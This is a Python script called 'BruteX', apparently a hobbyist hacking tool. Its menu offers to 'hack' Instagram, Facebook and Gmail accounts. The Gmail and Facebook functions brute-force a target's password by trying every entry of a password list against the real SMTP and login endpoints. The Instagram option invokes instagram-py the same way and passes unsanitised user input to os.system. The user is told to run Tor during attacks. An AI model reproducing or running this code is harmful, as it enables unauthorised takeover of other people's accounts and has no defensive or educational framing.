import os
import time
import smtplib
import requests
import sys
from bs4 import BeautifulSoup
from time import sleep

# Define the banner and menus
banr = "Banner here"  # Add your banner content here
main_menu = """
1. Hack Instagram
2. Hack Facebook
3. Hack Gmail
4. About
5. Follow Me
0. Exit

Choose an option: """

passs = """
1. Default Password List (.pass.txt)
2. Custom Password List
3. Go Back
0. Exit

Choose an option: """

soc = """
1. Follow on Instagram
2. Like Facebook Page
3. Follow on Github
4. Subscribe on YouTube
5. Join Telegram Channel
99. Go Back
0. Exit

Choose an option: """

# Define the hackmail function
def hackmail():
    class GmailBruteForce:
        def __init__(self):
            self.accounts = []
            self.passwords = []
            self.init_smtplib()

        def get_pass_list(self, path):
            with open(path, 'r', encoding='utf8') as file:
                self.passwords = file.read().splitlines()

        def init_smtplib(self):
            self.smtp = smtplib.SMTP("smtp.gmail.com", 587)
            self.smtp.starttls()
            self.smtp.ehlo()

        def try_gmail(self):
            for user in self.accounts:
                for password in self.passwords:
                    try:
                        self.smtp.login(user, password)
                        print(f"\033[1;37mGood -> {user} -> {password}\033[1;m")
                        print(f"The password {password} is the correct password for the account {user}")
                        self.smtp.quit()
                        self.init_smtplib()
                        break
                    except smtplib.SMTPAuthenticationError:
                        print(f"\033[1;31mSorry {user} -> {password}\033[1;m")

    instance = GmailBruteForce()
    instance.accounts.append(usr)
    instance.get_pass_list(passlist)
    instance.try_gmail()

# Define the hackbook function
def hackbook():
    if sys.version_info[0] != 3:
        sys.exit()

    post_url = 'https://www.facebook.com/login.php'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36',
    }
    payload = {}
    cookie = {}

    def create_form():
        form = {}
        cookie = {'fr': '0ZvhC3YwYm63ZZat1..Ba0Ipu.Io.AAA.0.0.Ba0Ipu.AWUPqDLy'}

        data = requests.get(post_url, headers=headers)
        for i in data.cookies:
            cookie[i.name] = i.value
        data = BeautifulSoup(data.text, 'html.parser').form
        if data.input['name'] == 'lsd':
            form['lsd'] = data.input['value']
        return (form, cookie)

    def function(email, passw, i):
        global payload, cookie
        if i % 10 == 1:
            payload, cookie = create_form()
            payload['email'] = email
        payload['pass'] = passw
        r = requests.post(post_url, data=payload, cookies=cookie, headers=headers)
        if 'Find Friends' in r.text or 'security code' in r.text or 'Two-factor authentication' in r.text:
            open('temp', 'w').write(str(r.content))
            print('\nPassword is : ', passw)
            print(f"The password {passw} is the correct password for the account {email}")
            return True
        return False

    file = open(passlist, 'r')

    print("\nTargeted ID :", usr)
    print("\033[1;91m[\033[1;97m*\033[1;91m]\033[1;92m Trying Passwords from password ...", '\033[1;91m', '\n')

    i = 0
    while file:
        passw = file.readline().strip()
        i += 1
        if len(passw) < 6:
            continue
        print(str(i) + " : ", passw)
        if function(usr, passw, i):
            break

# Main script start
os.system("xdg-open https://youtube.com/@Technolex")
time.sleep(5)

while True:
    os.system('clear')
    print(banr)
    menu = input(main_menu)
    if menu == '01' or menu == '1':
        print('\n\033[1;91m[\033[1;97m#\033[1;91m]\033[1;92m Run tor in another session of termux')
        sleep(1)
        while True:
            usr = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Target username:\033[1;97m ')
            if usr == '':
                print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No username detected\n')
            else:
                break

        while True:
            pas = input(passs)
            if pas == '01' or pas == '1':
                print()
                os.system("instagram-py --username " + usr + " --password-list .pass.txt")
                input("\033[1;94mPress ENTER To Continue")
                break
            elif pas == '02' or pas == '2':
                print()
                passlist = input('\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Password list path: \033[1;97m')
                os.system("instagram-py --username " + usr + " --password-list " + passlist)
                input("\033[1;94mPress ENTER To Continue")
                break
            elif pas == '3' or pas == '03':
                break
            elif pas == '0' or pas == '00':
                exit()

    elif menu == '02' or menu == '2':
        while True:
            usr = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Target User ID:\033[1;97m ')
            if usr == '':
                print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m User ID not detected')
            else:
                break
        while True:
            pas = input(passs)
            if pas == '':
                print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected')
            elif pas == '01' or pas == '1':
                print()
                passlist = '.pass.txt'
                break
            elif pas == '02' or pas == '2':
                print()
                passlist = input('\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Password list path:\033[1;97m ')
                if passlist == '':
                    print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected')
                else:
                    break
            elif pas == '03' or pas == '3':
                print()
                break
            elif pas == '0' or pas == '00':
                print()
                exit()
            else:
                print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Invalid input')
        hackbook()
        input("\033[1;94mPress ENTER To Continue")

    elif menu == '03' or menu == '3':
        while True:
            usr = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Target Email ID:\033[1;97m ')
            if usr == '':
                print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Email ID not detected')
            else:
                break

        while True:
            pas = input(passs)
            if pas == '':
                print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected\n')
            elif pas == '01' or pas == '1':
                print()
                passlist = '.pass.txt'
                break
            elif pas == '02' or pas == '2':
                print()
                passlist = input('\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Password list path:\033[1;97m ')
                if passlist == '':
                    print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected')
                else:
                    break
            elif pas == '03' or pas == '3':
                print()
                break
            elif pas == '0' or pas == '00':
                print()
                exit()
            else:
                print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Invalid input')

        hackmail()
        input("\033[1;94mPress ENTER To Continue")

    elif menu == '4' or menu == '04':
        print()
        print(about)
        while True:
            a = input('\n\033[1;91m[\033[1;97m?\033[1;91m]\033[1;92m Do you want to go to the main menu \033[1;91m[\033[1;97my/n\033[1;91m]\033[1;92m:\033[1;97m ')
            if a == 'y' or a == 'Y':
                break
            elif a == 'n' or a == 'N':
                exit()
            elif a == '':
                print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected')
                sleep(1)
            else:
                print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Invalid input')
                sleep(1)

    elif menu == '5' or menu == '05':
        os.system("clear")
        print(banr)
        print()
        print("\033[1;91m[\033[;1;97m~\033[1;91m] \033[1;92mThanks for using my tool 'BruteX'. You can follow me on various social media sites. Links and options are given down below, so select here the options where you want to follow me")
        print()
        print()
        while True:
            fol = input(soc)
            if fol == '1' or fol == '01':
                print()
                print("\033[1;91m[*] \033[1;97mOpening my Instagram profile in your device \n")
                time.sleep(1)
                os.system("xdg-open https://instagram.com/0hacker_x0")

            elif fol == '2' or fol == '02':
                print()
                print("\033[1;91m[*] \033[1;97mOpening my Facebook page in your device \n")
                time.sleep(1)
                os.system("xdg-open https://facebook.com/hackerxmr")

            elif fol == '3' or fol == '03':
                print()
                print("\033[1;91m[*] \033[1;97mOpening my Github profile in your device \n")
                time.sleep(1)
                os.system("xdg-open https://github.com/MrHacker-X")

            elif fol == '4' or fol == '04':
                print()
                print("\033[1;91m[*] \033[1;97mOpening my YouTube channel in your device \n")
                time.sleep(1)
                os.system("xdg-open https://youtube.com/@Technolex")

            elif fol == '5' or fol == '05':
                print()
                print("\033[1;91m[*] \033[1;97mOpening my Telegram Channel in your device \n")
                time.sleep(1)
                os.system("xdg-open https://t.me/hackwithalex")

            elif fol == '9' or fol == '99':
                print()
                print("\033[1;91m[*]\033[1;92m Getting back ...\n")
                time.sleep(1)
                break

            elif fol == '0' or fol == '00':
                print()
                exit()

            elif fol == '':
                print()
                print('No input detected')
                print()

            else:
                print()
                print("\033[1;91mInvalid Input")
                print()

    elif menu == '00' or menu == '0':
        print()
        exit()
    elif menu == '':
        print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m No input detected')
        sleep(1)
    else:
        print('\n\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Invalid input')
        sleep(1)
